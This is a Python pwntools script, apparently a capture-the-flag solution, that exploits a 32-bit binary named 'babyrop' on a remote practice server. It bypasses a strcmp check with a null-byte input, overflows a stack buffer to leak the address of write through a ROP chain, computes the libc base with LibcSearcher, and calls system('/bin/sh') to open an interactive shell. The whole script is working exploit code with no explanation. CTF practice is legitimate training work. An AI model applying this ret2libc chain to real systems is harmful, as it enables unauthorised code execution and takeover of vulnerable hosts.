#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',26545)
#p = process('./babyrop')
elf = ELF('./babyrop')
context.log_level='debug'

write_plt = elf.symbols['write']
write_got = elf.got['write']
func = 0x80487D0
main = 0x8048825

###bypass strcmp###
offset = 0x2c - 0x25 #buf v5
payload = '\x00' + ('\xff' * offset)
p.sendline(payload)
p.recvuntil("Correct\n")

###leak libc###
offset = 0xE7
payload = 'A' * offset + 'dead' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload)

write = u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
libc = LibcSearcher('write',write)
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')


###get shell###
payload = 'A' * offset + 'dead' + p32(system) + 'beef' + p32(sh)
p.sendline(payload)
p.interactive()

